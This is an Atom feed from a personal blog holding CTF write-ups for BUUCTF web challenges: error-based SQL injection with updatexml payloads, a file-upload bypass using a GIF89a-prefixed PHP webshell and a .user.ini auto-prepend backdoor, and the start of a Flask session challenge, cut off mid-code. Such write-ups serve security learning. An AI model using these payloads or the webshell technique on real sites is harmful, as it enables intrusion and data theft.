<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kanyun&#39;s Blog</title>
  
  
  <link href="https://kannikanyun.github.io/atom.xml" rel="self"/>
  
  <link href="https://kannikanyun.github.io/"/>
  <updated>2022-06-28T03:23:06.839Z</updated>
  <id>https://kannikanyun.github.io/</id>
  
  <author>
    <name>kanyun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUU刷题记4</title>
    <link href="https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/"/>
    <id>https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/</id>
    <published>2022-06-27T09:47:28.000Z</published>
    <updated>2022-06-28T03:23:06.839Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271421152.png" alt="image-20220627142124035"></p><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><h3 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; or 1&#x3D;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271425867.png" alt="image-20220627142554763"></p><p>过滤了and、=、空格、union、双写  等</p><h3 id="尝试报错注入："><a href="#尝试报错注入：" class="headerlink" title="尝试报错注入："></a>尝试报错注入：</h3><h4 id="报错注入使用场景"><a href="#报错注入使用场景" class="headerlink" title="报错注入使用场景"></a>报错注入使用场景</h4><ul><li><p>适合无直接回显的sql注入，存在报错页面的回显</p><blockquote><blockquote><p>有两个报错注入函数：</p><ol><li>extractvalue()</li><li>updatexml()</li></ol></blockquote></blockquote><h5 id="一、extractvalue函数"><a href="#一、extractvalue函数" class="headerlink" title="一、extractvalue函数"></a>一、extractvalue函数</h5><p>1.函数含义： 使用 XPath 表示法从 XML 字符串中提取值，即返回的是一个字符串。</p><p>2.用法</p><ul><li>ExtractValue(xml_frag, xpath_expr)<br>两个字符串参数：<br>(1). xml_frag: XML 标记片段，xml语言的标签闭合内的值，<br>(2). xpath_expr: XPath 表达式，匹配xml标签内的值并返回。<br>例如，</li></ul><pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#39;) AS val1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>val1的值为ccc，而不为ddd，因为a标签中闭合的是ccc，<br>若是想匹配值为ddd，则如下：</p><pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;&#x2F;b&#39;) AS val2;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时val2的值为ddd。</p><p>3.报错注入使用场景</p><ul><li>适合无直接回显的sql注入，存在报错页面的回显</li></ul><p>4.报错的原因</p><blockquote><p>ExtractValue函数中的两个参数，得是xpath语法才会正常回显，如果不是xpath语法，则会报错并回显。</p></blockquote><blockquote><blockquote><p>extractvalue报错会返回其中的sql语句结果。</p></blockquote></blockquote><p>5.配合函数<br>原因：报错注入会限制数据库内容不超过32字节，所以灵活使用一些函数来截取数据内容，最后再进行拼接。</p><ul><li>mid函数： 返回从指定位置开始的子字符串</li><li>substr函数：返回指定的子字符串</li><li>concat函数： 返回连接的字符串</li></ul><p>6.常用peayload：<br>例子：CVE-2020-5504 phpmyadmin的后台sql注入（狗头保命，都sql的管理后台了，还在这注入呢）</p><ul><li>数据库</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="我们选择："><a href="#我们选择：" class="headerlink" title="我们选择："></a>我们选择：</h3></li></ul><blockquote><p>使用updatexml报错注入</p></blockquote><p><code>updatexml</code>函数与<code>extractvalue</code>函数用法一样</p><pre class="line-numbers language-none"><code class="language-none">updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Payload1-查看版本"><a href="#Payload1-查看版本" class="headerlink" title="Payload1(查看版本):"></a>Payload1(查看版本):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~10.3.18-MariaDB~&#39;</code></p></blockquote><h4 id="Payload2-爆库"><a href="#Payload2-爆库" class="headerlink" title="Payload2(爆库):"></a>Payload2(爆库):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~geek~&#39;</code></p></blockquote><h4 id="Payload3-爆表"><a href="#Payload3-爆表" class="headerlink" title="Payload3(爆表):"></a>Payload3(爆表):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~H4rDsq1~&#39;</code></p></blockquote><h4 id="Payload4-爆字段名"><a href="#Payload4-爆字段名" class="headerlink" title="Payload4(爆字段名):"></a>Payload4(爆字段名):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23</code><br><code>&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p></blockquote><h4 id="Payload5-爆字段值"><a href="#Payload5-爆字段值" class="headerlink" title="Payload5(爆字段值):"></a>Payload5(爆字段值):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#39;--&#39;,password))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~flag--flag&#123;a007ebd8-50c7-495f-b&#39;</code></p></blockquote><blockquote><blockquote><p>flag并没有完全显示</p></blockquote></blockquote><blockquote><p>right()查询后半段</p><h2 id="RIGHT-str-len"><a href="#RIGHT-str-len" class="headerlink" title="RIGHT(str,len)"></a>RIGHT(str,len)</h2><p>​    返回最右侧的n个字符的字符串str，或NULL如果任何参数是NULL                                                     </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">></span> <span class="token keyword">SELECT</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token operator">|</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>                                   <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token operator">|</span> rbar                                                    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="Payload6-查右半段flag"><a href="#Payload6-查右半段flag" class="headerlink" title="Payload6(查右半段flag):"></a>Payload6(查右半段flag):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~8-50c7-495f-b702-058e970280f2&#125;~&#39;</code></p></blockquote><h4 id="flag拼接得："><a href="#flag拼接得：" class="headerlink" title="flag拼接得："></a>flag拼接得：</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>a007ebd8<span class="token operator">-</span><span class="token number">50</span>c7<span class="token operator">-</span><span class="token number">495</span>f<span class="token operator">-</span>b702<span class="token operator">-</span><span class="token number">058e970280</span>f2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li><p>在无回显的情况下，选择报错注入—-updatexml()</p></li><li><blockquote><p>原因：格式简单😂</p></blockquote></li><li><p>在GET传参时注意  <code>&#39;</code>  –&gt;%27  、  <code>#</code>  –&gt; %23</p></li><li><p>sql中的right()函数，可从右显示字段值</p></li></ol><hr><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="题目环境：-1"><a href="#题目环境：-1" class="headerlink" title="题目环境："></a>题目环境：</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271911961.png" alt="image-20220627191110906"></p><p>是一个文件上传的界面，很明显这是关于<strong>文件上传漏洞</strong>方面的题目。</p><h2 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h2><h3 id="尝试一句话木马："><a href="#尝试一句话木马：" class="headerlink" title="尝试一句话木马："></a>尝试一句话木马：</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271945574.png" alt="image-20220627194516522"></p><blockquote><p>提示：<u><em><strong>非法的后缀</strong></em></u></p></blockquote><h3 id="尝试绕过-lt-的图片马："><a href="#尝试绕过-lt-的图片马：" class="headerlink" title="尝试绕过&lt;?的图片马："></a>尝试绕过&lt;?的图片马：</h3><blockquote><p><code>&lt;? in contents!</code></p></blockquote><blockquote><p> 提示包含了&lt;?   ,   表示过滤了含有“&lt;?”的文件</p></blockquote><h3 id="尝试绕过-lt"><a href="#尝试绕过-lt" class="headerlink" title="尝试绕过&lt;?"></a>尝试绕过&lt;?</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>回显：<code>exif_imagetype:not image!</code></p></blockquote><h3 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype"></a>exif_imagetype</h3><blockquote><ol><li><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p></li><li><p>exif_imagetype — 判断一个图像的类型</p><p><em><strong><u>说明:</u></strong></em></p></li><li><p>exif_imagetype ( string $filename ) : int</p></li><li><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p></li><li><p><u><em><strong>说明题目后端会截取上传的文件的头部一部分进行判断是否为图像文件</strong></em></u></p></li></ol></blockquote><h3 id="GIF89a图片头文件欺骗，"><a href="#GIF89a图片头文件欺骗，" class="headerlink" title="GIF89a图片头文件欺骗，"></a><strong>GIF89a图片头文件欺骗，</strong></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 回显：</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fdYour files <span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><blockquote><p>图片马是上去啦，但是服务器并不会执行里面的代码</p></blockquote></blockquote><blockquote><p>因此这里涉及另一个知识点：</p></blockquote><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><strong>文件包含漏洞</strong></h3><h4 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h4><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="https://img-blog.csdnimg.cn/20210205232411887.png" alt="img"></p><ol><li><blockquote><p>auto_prepend_file，指定一个文件，自动包含在要执行的文件*<u><strong>前</strong></u>*，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p></blockquote></li><li><blockquote><p>```ini<br>GIF89a                  //绕过exif_imagetype()<br>auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。<br>auto_append_file=a.jpg  //解析后进行包含</p><pre class="line-numbers language-none"><code class="language-none">&#96;GIF89a.png&#96;是要包含的文件。3. &gt; 因此，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。&gt; 优势：跟&#96;.htaccess&#96;后门比，适用范围更广，nginx&#x2F;apache&#x2F;IIS都有效，而&#96;.htaccess&#96;只适用于apache#### 使用场景：**某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。**### Payload1:上传user.ini&#96;&#96;&#96;iniGIF89aauto_prepend_file&#x3D;GIF89a.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li></ol><blockquote><p>前面加GIF89a，来绕过检测</p></blockquote><p>回显：</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fd Your files <span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".user.ini"</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="Payload2-上传GIF89a-png"><a href="#Payload2-上传GIF89a-png" class="headerlink" title="Payload2:上传GIF89a.png"></a>Payload2:上传GIF89a.png</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回显：</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fdYour files <span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><blockquote><blockquote><p>此时<code>index.php</code>就派上了用场(辅助执行木马)</p></blockquote></blockquote></blockquote><h3 id="Finally-Payload"><a href="#Finally-Payload" class="headerlink" title="Finally Payload:"></a>Finally Payload:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//643e64f0-56f2-4c6a-a8fc-600932030edc.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206272109751.png" alt="image-20220627210907712"></p><p>根目录得到flag</p><h2 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h2><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;var_dump(scandir(&quot;&#x2F;&quot;)); shell&#x3D;var_dump(file_get_contents(&quot;&#x2F;flag&quot;)); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><ol><li><blockquote><p>一句话木马绕过&lt;?</p></blockquote></li><li><blockquote><p>绕过exif_imagetype()方法的检测</p></blockquote></li><li><blockquote><p>.user.ini文件会更新消失</p></blockquote></li></ol><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题3</title>
    <link href="https://kannikanyun.github.io/2022/06/26/BUU%E5%88%B7%E9%A2%983/"/>
    <id>https://kannikanyun.github.io/2022/06/26/BUU%E5%88%B7%E9%A2%983/</id>
    <published>2022-06-26T01:19:05.000Z</published>
    <updated>2022-06-27T09:50:11.706Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="题目环境："><a href="#题目环境：" class="headerlink" title="题目环境："></a>题目环境：</h2><p>拿到题目</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d2e91a4-70d2-49da-98f1-83d166f947bd.node4.buuoj.cn:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>f12查看源代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- you are not admin --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现提示要成为admin</p><p>随便注册个账号，登入后，在</p><pre class="line-numbers language-none"><code class="language-none">view-source:http:&#x2F;&#x2F;admin.2018.hctf.io&#x2F;change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现提示</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206261255321.png" alt="image-20220626125539293"></p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是下载源码</p><h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>拿到代码后，查看了下路由route.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> logout_user<span class="token punctuation">,</span> LoginManager<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_user<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token punctuation">,</span> db<span class="token keyword">from</span> config <span class="token keyword">import</span> Config<span class="token keyword">from</span> app<span class="token punctuation">.</span>models <span class="token keyword">import</span> User<span class="token keyword">from</span> forms <span class="token keyword">import</span> RegisterForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> NewpasswordForm<span class="token keyword">from</span> twisted<span class="token punctuation">.</span>words<span class="token punctuation">.</span>protocols<span class="token punctuation">.</span>jabber<span class="token punctuation">.</span>xmpp_stringprep <span class="token keyword">import</span> nodeprep<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> code <span class="token keyword">import</span> get_verify_code<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 图片以二进制形式写入</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 把buf_str作为response返回前端，并设置首部字段</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment"># 将验证码字符串储存在session中</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'hctf'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token 